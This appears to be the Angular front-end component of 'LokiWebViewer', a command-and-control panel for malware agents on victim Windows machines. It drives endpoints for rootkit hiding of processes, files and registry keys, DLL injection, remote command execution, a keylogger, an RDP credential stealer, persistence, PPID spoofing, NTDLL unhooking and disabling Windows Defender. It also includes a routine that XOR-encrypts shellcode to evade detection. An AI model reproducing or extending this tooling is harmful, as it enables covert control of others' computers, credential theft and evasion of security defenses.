import { Component } from '@angular/core';
import { RouterOutlet } from '@angular/router';
import { HttpClient, HttpClientModule, HttpHeaders } from '@angular/common/http';
import { CommonModule, NgFor } from '@angular/common';
import { FormsModule } from '@angular/forms';
import { NgxPaginationModule } from 'ngx-pagination';
import { Router } from '@angular/router';
import { ServerService } from './server.service';
// ngFor

@Component({
  selector: 'app-root',
  standalone: true,
  imports: [RouterOutlet, HttpClientModule, CommonModule, FormsModule, NgxPaginationModule],
  templateUrl: './app.component.html',
  styleUrl: './app.component.css'
})


export class AppComponent {
  title = 'LokiWebViewer';
  SEVER_URL = this.serverService.getUrl();
  agentsEndpoint = this.SEVER_URL + '/Agent/Agents';
  onlineEndpoint = this.SEVER_URL + '/Agent/Online';
  deleteEndpoint = this.SEVER_URL + '/Agent/Delete';
  createEndpoint = this.SEVER_URL + '/Agent/Create';
  folderEndpoint = this.SEVER_URL + '/Action/Folder';
  executeEndpoint = this.SEVER_URL + '/Action/ExecuteAsAdmin';
  isRootkitEndpoint = this.SEVER_URL + '/Action/IsInstalled';
  dllInjectionEndpoint = this.SEVER_URL + '/Action/DLLInjection';
  hideProcessEndpoint = this.SEVER_URL + '/Action/HideProcess';
  hideDirectoryEndpoint = this.SEVER_URL + '/Action/HideDirectory';
  hideRegistryEndpoint = this.SEVER_URL + '/Action/HideRegistry';
  unhideProcessEndpoint = this.SEVER_URL + '/Action/UnhideProcess';
  unhideDirectoryEndpoint = this.SEVER_URL + '/Action/UnhideDirectory';
  unhideRegistryEndpoint = this.SEVER_URL + '/Action/UnhideRegistry';
  executeCommandEndpoint = this.SEVER_URL + '/Action/ExecuteCommand';
  createTaskEndpoint = this.SEVER_URL + '/Action/CreateTask';
  isKeyloggerEndpoint = this.SEVER_URL + '/Action/Keylogger';
  isRDPStealerEndpoint = this.SEVER_URL + '/Action/RDPStealer';
  isSecurityEndpoint = this.SEVER_URL + '/Action/Security';
  uninstallEndpoint = this.SEVER_URL + '/Agent/Uninstall';
  persistenceEndpoint = this.SEVER_URL + '/Action/Persistence';
  ppidSpoofingEndpoint = this.SEVER_URL + '/Action/PSpoofing';
  exeAsServiceEndpoint = this.SEVER_URL + '/Action/Service';
  unhookEndpoint = this.SEVER_URL + '/Action/Unhook';
  windefEndpoint = this.SEVER_URL + '/Action/WinDef';
  agents: any = [];
  loading: boolean = false;
  selectedId: string = "";
  taskSchId: number = 0;
  taskSch: boolean = false;
  totalItems: number = 0;
  pageSize: number = 13;
  processToHide: string = "";
  processToUnhide: string = "";
  fileToHide: string = "";
  fileToUnhide: string = "";
  registryToHide: string = "";
  registryToUnhide: string = "";
  currentPageR: number = 1;
  rootkitId: number = 0;
  tableSize: number[] = [5, 10, 15, 20];
  isAddAgent: boolean = false;
  url: string = '';
  isFileExplorer: boolean = false;
  path: string = '';
  agentId: number = 0;
  executeAsAdmin: boolean = false;
  isInstalled: boolean = false;
  isNowInstalled: boolean = false;
  pathExecute: string = '';
  isDLLInjection: boolean = false;
  processName: string = '';
  dllPath: string = '';
  agentIdDLL: number = 0;
  rootkitInit = false;
  pagingConfig: PagingConfig = {} as PagingConfig;
  message: string = '';
  isError: boolean = false;
  enc: boolean = false;
  shellcode: string = "";
  shellcodePass: string = "";
  encryptionType: string = "";
  shellcod1: number[] = [];
  iscommandExecution: boolean = false;
  commandToExecute: string = "";
  idCommand: number = 0;
  taskName: string = "";
  commandTask: string = "";
  parametersTask: string = "";
  intervalTask: number = 0;
  isKeylogger: boolean = false;
  keyloggerID: number = 0;
  keyloggerResult: any;
  installedNow: boolean = false;
  haveKeyloggerResults: boolean = false;
  rdpStealerP: boolean = false;
  rdpStealerID: number = 0;
  haveRDPResults: boolean = false;
  rdpResult: any;
  installRDPedNow: boolean = false;
  defensesPopup: boolean = false;
  defensesID: number = 0;
  haveSecurityResults: boolean = false;
  securityResult: any[] = [];
  isNowInstalledSec: boolean = false;
  persistencePopup: boolean = false;
  persistenceID: number = 0;  
  persistenceResult: any;
  persistenceResults: boolean = false;
  persistencePath: string = "";
  persistenceName: string = "";
  ppidSpoofingPopup: boolean = false;
  ppidSpoofingID: number = 0;
  ppidPath: string = "";
  ppidName: string = "";
  exeAsService: boolean = false;
  exeAsServiceID: number = 0;
  serviceName: string = "";
  servicePath: string = "";
  unhookNTDLLID: number = 0;
  unhookPopup: boolean = false;
  unhookProcess: string = "";
  winDef: boolean = false;
  winDefID: number = 0;
  winDefResult: any;


  constructor(private http: HttpClient, private router: Router, private serverService: ServerService) {
    this.flashMessage(5000, "Welcome to LokiWebViewer", false);
    this.getAgents();
    this.loading = false;
    // this.agents = [
    //   { id: 1, user: 'Agent1', ip: '127.0.0.2', online: 1 },  
    // ]
    this.pagingConfig = {
      itemsPerPage: this.pageSize,
      currentPage: this.currentPageR,
      totalItems: this.totalItems
    }
  }

  flashMessage(time: number, message: string, isError: boolean) {
    this.message = message;
    this.isError = isError;
    setTimeout(() => {
      this.message = "";
    }, time);
  }

  getAgents() {
    this.loading = true;
    this.http.get(this.agentsEndpoint).subscribe((data: any) => {
      this.agents = data;
      this.pagingConfig.totalItems = this.agents.length;
      console.log(data);
      console.log(this.totalItems);
      this.loading = false;
    });
  }

  onTableDataChange(event: any) {
    this.pagingConfig.currentPage = event;
    this.getAgents();
  }

  addAgent() {
    console.log('add agent');
    this.isAddAgent = true;
  }

  explorerConfirm() {
    console.log(this.path);
    this.http.post(this.folderEndpoint, { path: this.path, id: this.agentId.toString() }).subscribe((data: any) => {
      this.isFileExplorer = false;
      // go to /explorer/:id
    });
    this.router.navigate(['/explorer', this.agentId]);
    this.isFileExplorer = false;
  }




  createAgent() {
    console.log(this.url);
    if (this.url.endsWith('/')) {
      this.url = this.url.slice(0, -1);
    }
    if (this.url !== '') {
      this.http.post(this.createEndpoint, { serverURL: this.url }).subscribe((data: any) => {
        this.getAgents();
        this.isAddAgent = false;
        this.flashMessage(4000, "Agent has been created, check the Agents folder in the server", false);
      });
    }

  }

  fileExplorer(id: number) {
    console.log(id);
    this.agentId = id;
    this.isFileExplorer = true;
    this.router.navigate(['/explorer', id]);
  }

  onTableSizeChange(event: any): void {
    this.pagingConfig.itemsPerPage = event.target.value;
    this.pagingConfig.currentPage = 1;
    this.getAgents();
  }

  freeInjection(id: number) {
    console.log("free injector");
    this.taskSch = true;
    this.taskSchId = id;
  }

  closeFree(){
    this.taskSch = false;
  }

  createTask(){
    console.log("inject");
    if(this.taskName == "" || this.commandTask == "" || this.intervalTask == 0){
      this.flashMessage(4000, "Please enter the required fields", true);
      return;
    }

    this.http.post(this.createTaskEndpoint, {taskName: this.taskName, command: this.commandTask, parameters: this.parametersTask, interval: this.intervalTask, id: this.taskSchId.toString()}).subscribe((data: any) => {
      console.log(data);
      this.taskSch = false;
    });

    this.taskSch = false;
    this.flashMessage(4000, "Task has been created", false);
  }

  closePopup() {
    this.isAddAgent = false;
  }

  closeExecutePopup() {
    this.executeAsAdmin = false;
  }

  onlineClick(online: any, id: number) {
    console.log(online);
    if (online === 1) {
      this.http.post(this.onlineEndpoint, { online: 0, id: id }).subscribe((data: any) => {
        this.getAgents();
      });
    }
  }

  initRootkitClick(id: number) {
    this.loading = true;
    this.http.post(this.isRootkitEndpoint, { id: id.toString() }).subscribe((data: any) => {
      if (data === true) {
        this.isNowInstalled = true;
        this.loading = false;
      }
    });
    this.rootkitId = id;
    this.rootkitInit = true;
  }

  hider(){
    console.log("hider"); 
    this.loading = true;
    // detect what input is filled
    let object = {
      processToHide: "",
      fileToHide: "",
      registryToHide: "",
    }

    // only one of these will be filled
    if(this.processToHide != "" && this.fileToHide != "" || this.processToHide != "" && this.registryToHide != "" || this.fileToHide != "" && this.registryToHide != ""){
      console.log("only one of these will be filled");
      this.flashMessage(4000, "Only on input field can be filled", true);
      // error message
      return;
    }

    if(this.processToHide != ""){
      object.processToHide = this.processToHide;
      this.flashMessage(4000, "Process has been hidden", false);
      this.http.post(this.hideProcessEndpoint, {processName: this.processToHide, id: this.rootkitId.toString()}).subscribe((data: any) => {
        console.log(data);
        this.loading = false;
      });
    }
    if(this.fileToHide != ""){
      object.fileToHide = this.fileToHide;
      // if have / change to \ 
      if(this.fileToHide.includes('/')){
        this.fileToHide = this.fileToHide.replace(/\//g, '\\');
      }
      this.flashMessage(4000, "Directory has been hidden", false);
      this.http.post(this.hideDirectoryEndpoint, {path: this.fileToHide, id: this.rootkitId.toString()}).subscribe((data: any) => {
        console.log(data);
        this.loading = false;
      });
    }
    if(this.registryToHide != ""){
      object.registryToHide = this.registryToHide;
      this.flashMessage(4000, "Registry has been hidden", false);
      this.http.post(this.hideRegistryEndpoint, {registry: this.registryToHide, id: this.rootkitId.toString()}).subscribe((data: any) => {
        console.log(data);
        this.loading = false;
      });
    }
  }

  encryptButtonClick(){
    console.log("spw ap")
    this.enc = true;
  }

  initRootkit(){
    this.http.post(this.SEVER_URL + '/Action/Rootkit', {id:this.rootkitId.toString()}).subscribe((data: any) => {
      console.log(data);
    });
  }

  closePopupRootkit() {
    this.rootkitInit = false;
  }

  deleteAgent(id: number) {
    this.http.post(this.deleteEndpoint, { id: id }).subscribe((data: any) => {
      this.getAgents();
    });
  }

  executeAsAdminActive(id: number) {
    this.executeAsAdmin = true;
    this.selectedId = id.toString();
  }

  closeCom(){
    this.iscommandExecution = false;
  }

  executeCommand(){
    console.log(this.commandToExecute);
    this.http.post(this.executeCommandEndpoint, { command: this.commandToExecute, id: this.idCommand.toString() }).subscribe((data: any) => {
      this.iscommandExecution = false;
      console.log(data);
    });
  }

  systemEnumeration(id: number) {
    console.log("system enumeration");
    this.router.navigate(['/enumeration', id]);
  }

  confirmExecuteAsAdmin() {
    console.log(this.pathExecute);
    this.http.post(this.executeEndpoint, { exePath: this.pathExecute, id: this.selectedId }).subscribe((data: any) => {
      this.executeAsAdmin = false;
      console.log(data);
    });
  }

  listProcesses(id: number) {
    console.log("dem");
    this.router.navigate(['/processes', id]);
  }

  dllInjection(id: number) {
    console.log("dll");
    this.isDLLInjection = true;
    this.agentIdDLL = id;
  }

  closePopupDLL() {
    this.isDLLInjection = false;
  }

  commandExecution(id: number) {
    console.log("command");
    this.iscommandExecution = true;
    this.idCommand = id;
    
  }

  keylogger(id: number) {
    console.log("keylogger");
    this.isKeylogger = true;
    this.keyloggerID = id;
  }

  finalKeylogger(){
    this.http.post(this.isKeyloggerEndpoint, { id: this.keyloggerID.toString() }).subscribe((data:any) => {
      this.keyloggerResult = data;
      console.log(data);
      if(this.keyloggerResult.toString() === "Keylogger NO"){
        console.log("Entra al if");
        this.flashMessage(5000, "Keylogger Installed in the Victim System", false);
        this.isNowInstalled = true;
      }
      if (Array.isArray(this.keyloggerResult)) {
        console.log('this.keyloggerResult es un array');
        this.haveKeyloggerResults = true;
        this.seeKeyloggerResults();
      } else {
        console.log('this.keyloggerResult no es un array');
        this.flashMessage(5000, "Not keylogger results captured yet", true);
      }

    });
  }

  seeKeyloggerResults(){
    console.log("Results are " + this.keyloggerResult);

  }

  closeKeylogger(){
    this.isKeylogger = false;
    this.haveKeyloggerResults = false;
    this.keyloggerID = 0;
    this.keyloggerResult = "";
    this.isNowInstalled = false;
  }

  rdpStealer(id: number){
    this.rdpStealerP = true;
    this.rdpStealerID = id;
  }

  closeRDP(){
    this.rdpStealerP = false;
  }

  finalRDP(){
    console.log("rdp");
    this.http.post(this.isRDPStealerEndpoint, { id: this.rdpStealerID.toString() }).subscribe((data:any) => {
      this.rdpResult = data;
      console.log(data);
      if(this.rdpResult.toString() === "RDP Stealer NO"){
        console.log("Entra al if");
        this.haveRDPResults = false;
        this.flashMessage(5000, "RDP Stealer Installed in the Victim System", false);
        this.installRDPedNow = true;
      }
      if (Array.isArray(this.rdpResult)) {
        console.log('this.rdpResult es un array');
        console.log(this.rdpResult);
        // usernaame:password
        // this.rdpResult.forEach((element: any, index) => {
        //   console.log(element);
        //   let creds = element.split(":");
        //   this.rdpResult[index] = "Username: " + creds[0] + " Password: " + creds[1];
        // });
        this.haveRDPResults = true;
      } else {
        console.log('this.rdpResult no es un array');
        this.flashMessage(5000, "Not RDP Stealer results captured yet", true);
      }
    });
  }


  encryptShellcode(){
    if(this.shellcodePass == ""  || this.shellcode == ""){
      this.flashMessage(4000, "Please enter the required fields", true);
      return;
    }

    // remove all the " and ; from the shellcode
    this.shellcode = this.shellcode.replace(/"/g, '');
    this.shellcode = this.shellcode.replace(/;/g, '');

    //shellcode pass must be a number
    if(isNaN(parseInt(this.shellcodePass))){
      this.flashMessage(4000, "Shellcode pass must be a number", true);
      return;
    }

    console.log(this.encryptionType);
    if(parseInt(this.encryptionType) == 0){
      this.shellcod1 = this.convertShellcodeToByteArray(this.shellcode);
      this.shellcode = this.XOR_encrypt(this.shellcod1, parseInt(this.shellcodePass));
      console.log(this.shellcode);
      this.flashMessage(4000, "Shellcode has been encrypted", false);
      return;
    }
    if(parseInt(this.encryptionType) == 1){
      this.flashMessage(4000, "AES not implemented yet", true);
      return;
    }
  }

  convertShellcodeToByteArray(shellcode: string): number[] {
    const hexPairs = shellcode.replace(/\\x/g, '').match(/.{1,2}/g);
    if (!hexPairs) {
        return [];
    }

    // Convierte cada par de caracteres hexadecimal a un número decimal
    const byteArray = hexPairs.map(hex => parseInt(hex, 16));

    return byteArray;
}

  XOR_encrypt(payload: number[], key: number): string {
    let encryptedPayload: number[] = [];
    for (let i = 0; i < payload.length; i++) {
        encryptedPayload.push(payload[i] ^ key);
    }
    return encryptedPayload.map(byte => '\\x' + byte.toString(16)).join('');
}

  closeEnc(){
    this.enc = false;
  }

  dllInjectionConfirm() {
    console.log(this.processName);
    console.log(this.dllPath);
    // if have / change to \\
    if (this.dllPath.includes('/')) {
      this.dllPath = this.dllPath.replace(/\//g, '\\');
    }
    this.http.post(this.dllInjectionEndpoint, { processName: this.processName, dllPath: this.dllPath, id: this.agentIdDLL.toString() }).subscribe((data: any) => {
      this.isDLLInjection = false;
      console.log(data);
    });
    this.isDLLInjection = false;
  }

  cancelRootkit() {
    this.rootkitInit = false;
  }

  securityDetector(id: number){
    this.defensesPopup = true;
    this.defensesID = id;
  }

  closeSecurity(){
    this.defensesPopup = false;
    this.haveSecurityResults = false;
    this.securityResult = [];
    this.defensesID = 0;
  }

  finalSecurity(){
    console.log("final")
    this.http.post(this.isSecurityEndpoint, { id: this.defensesID.toString() }).subscribe((data:any) => {
      this.securityResult = data;
      this.securityResult = this.securityResult[0].split(",");
      this.securityResult.pop();
      console.log(this.securityResult);
      if (Array.isArray(this.securityResult)) {
        console.log('this.securityResult es un array');
        this.haveSecurityResults = true;
      } else {
        this.isNowInstalledSec = true;

        console.log('this.securityResult no es un array');
        this.flashMessage(5000, "Not security results captured yet", true);
      }
    });
  }

  unistall(id: number){
    console.log("uninstall");
    this.http.post(this.uninstallEndpoint, { id: id }).subscribe((data: any) => {
      this.getAgents();
      this.http.post(this.deleteEndpoint, { id: id }).subscribe((data: any) => {
        this.getAgents();
      });
    });
  }

  persistence(id: number){
    this.persistenceID = id;
    this.persistencePopup = true;
  }

  closePersistence(){
    this.persistencePopup = false;
  }

  createPersistence(){
    if(this.persistenceName == "" || this.persistencePath == ""){
      this.flashMessage(4000, "Please enter the required fields", true);
      return;
    }
    this.http.post(this.persistenceEndpoint, { id: this.persistenceID.toString(), name: this.persistenceName, path: this.persistencePath }).subscribe((data: any) => {
      this.flashMessage(4000, "Persistence has been created", false);
      this.persistencePopup = false;
    });
  }

  ppidSpoofing(id: number){
    this.ppidSpoofingID = id;
    this.ppidSpoofingPopup = true;
  }

  closePPID(){
    this.ppidSpoofingPopup = false;
  }

  createPPID(){
    if(this.ppidName == "" || this.ppidPath == ""){
      this.flashMessage(4000, "Please enter the required fields", true);
      return;
    }
    this.http.post(this.ppidSpoofingEndpoint, { id: this.ppidSpoofingID.toString(), process: this.ppidName, path: this.ppidPath }).subscribe((data: any) => {
      this.flashMessage(4000, "PPID Spoofing has been created", false);
      this.ppidSpoofingPopup = false;
    });
  }

  executeAsService(id: number){
    this.exeAsService = true;
    this.exeAsServiceID = id;
  }

  closeService(){ 
    this.exeAsService = false;
  }

  createService(){
    if(this.serviceName == "" || this.servicePath == ""){
      this.flashMessage(4000, "Please enter the required fields", true);
      return;
    }
    this.http.post(this.exeAsServiceEndpoint, { id: this.exeAsServiceID.toString(), name: this.serviceName, path: this.servicePath }).subscribe((data: any) => {
      this.flashMessage(4000, "Service has been created", false);
      this.exeAsService = false;
    });
  }

  unhookNTDLL(id: number){
    this.unhookNTDLLID = id;
    this.unhookPopup = true;
  }

  closeUnhook(){
    this.unhookPopup = false;
  }

  unhook(){
    if(this.unhookProcess == ""){
      this.flashMessage(4000, "Please enter the required fields", true);
      return;
    }
    this.http.post(this.unhookEndpoint, { id: this.unhookNTDLLID.toString(), process: this.unhookProcess }).subscribe((data: any) => {
      this.flashMessage(4000, "NTDLL has been unhooked", false);
      this.unhookPopup = false;
    });   
  }

  closeWinDefPopup(){
    this.winDef = false;
  }


  winDefender(id: number){
    this.winDef = true;
    this.winDefID = id;
  }

  winDefenderFinal(){
    console.log("windef");
    this.http.post(this.windefEndpoint, { id: this.winDefID.toString() }).subscribe((data: any) => {
      this.winDefResult = data;
      this.winDef = false;
      this.flashMessage(5000, "Windows Defender has been disabled", false);
    });
  }

}

export interface PagingConfig {
  currentPage: number;
  itemsPerPage: number;
  totalItems: number;
}